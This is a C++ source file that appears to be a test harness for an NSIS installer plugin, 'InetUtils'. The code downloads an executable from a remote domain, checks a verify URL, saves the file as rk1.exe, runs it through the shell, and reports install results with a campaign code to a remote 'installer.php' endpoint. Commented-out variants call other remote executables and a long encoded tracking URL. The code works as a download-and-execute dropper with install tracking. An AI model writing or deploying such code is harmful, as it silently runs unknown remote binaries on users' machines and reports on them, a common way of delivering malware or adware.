#include "stdafx.h"

#include <windows.h>
#include <wininet.h>
#include <tchar.h>
#include <stdio.h>
#include <map>

#define NSIS_MAX_STRLEN 1024

#include "InetUtils.h"

extern std::map<DWORD, DWORD> DownloadThreads;

int _tmain(int argc, _TCHAR* argv[])
{
	//TCHAR url[NSIS_MAX_STRLEN] = TEXT("https://korzuno.s3.eu-north-1.amazonaws.com/__argv.exe?hello=89");
	TCHAR url[NSIS_MAX_STRLEN] = TEXT("http://192.168.11.143/get.php");
	//TCHAR url[NSIS_MAX_STRLEN] = TEXT("https://trentapp.com/?y49xvTzAWDVYVgCZEgNzJaNkw7mj2a4jabUknl7IL0rHNo8PIMtMbeovzHIFE5NN%2B1Q7vIHAWAw3Q60OsCy4rH6T2AwVl7AaKO%2BA5beTMQ9olz6NuzkP6WTx4JYUNuskKZnspbsHMXhj4BUrUm18%2BtUZyEuQMFrGCPLlePbAE6Cn7EzwB1EIKEkLffvpi%2BXoXTdw0%2FDKoxAEtTCG6GvDvw%3D%3D");
	
	TCHAR file[NSIS_MAX_STRLEN] = TEXT("_https.exe");
	DWORD dwTotal = NSIS_MAX_STRLEN;
	DWORD dwResult;
	
	InetDownloadAndRunParams *lpParams = new InetDownloadAndRunParams();
	_tcscpy_s(lpParams->lpszDownloadURI, NSIS_MAX_STRLEN, TEXT("https://appfruitful.com/relevant.exe?quant=1356952505"));
	_tcscpy_s(lpParams->lpszVerifyURI, NSIS_MAX_STRLEN, TEXT("https://appfruitful.com/info.php?quant=1356952505"));
	_tcscpy_s(lpParams->lpszReportURI, NSIS_MAX_STRLEN, TEXT("https://appfruitful.com/installer.php?CODE=PUTGQ&quant=1356952505&action="));
	_tcscpy_s(lpParams->lpszFileCode, NSIS_MAX_STRLEN, TEXT("rk1"));
	_tcscpy_s(lpParams->lpszFileName, NSIS_MAX_STRLEN, TEXT("d:\\InetUtils\\InetUtils\\rk1.exe"));
	_tcscpy_s(lpParams->lpszResultGood, NSIS_MAX_STRLEN, TEXT("1935"));
	_tcscpy_s(lpParams->lpszResultBad, NSIS_MAX_STRLEN, TEXT("1936"));
	_tcscpy_s(lpParams->lpszCmdArgs, NSIS_MAX_STRLEN, TEXT("/param0=0"));
	lpParams->type = InetUtils::ExecShell;
	
	DWORD dwId;
	
	HANDLE hThreadHandle = CreateThread(
		0,
		0,
		(LPTHREAD_START_ROUTINE)InetUtils::DownloadAndRunFileThread,
		(LPVOID)lpParams,
		0,
		&dwId
	);

	_tprintf(TEXT("Thread id: %d\n"), dwId);

	Sleep(15000);

	DownloadThreads[dwId] = 1;

	DWORD ok = WAIT_OBJECT_0;
	ok = WaitForSingleObject(hThreadHandle, INFINITE);
	
	GetExitCodeThread(hThreadHandle, &dwResult);

	/*
	dwResult = InetUtils::DownloadAndRunFileEx(
		TEXT("https://appfruitful.com/relevant.exe?quant=1355595965"),
		TEXT("https://appfruitful.com/info.php?quant=1355595965"),
		TEXT("https://appfruitful.com/installer.php?CODE=PUTGQ&quant=1355595965&action="),
		TEXT("rk1"),
		TEXT("d:\\InetUtils\\InetUtils\\rk1.exe"),
		TEXT("1935"),
		TEXT("1936"),
		TEXT("/param0=0"),
		InetUtils::ExecShell
	);
	*/
	
	/*
	dwResult = InetUtils::InternetRequestFeedback (
		url,
		file,
		&dwTotal
	);
	*/

	_tprintf(TEXT("Result: %d\n"), dwResult);

	return 0;
}
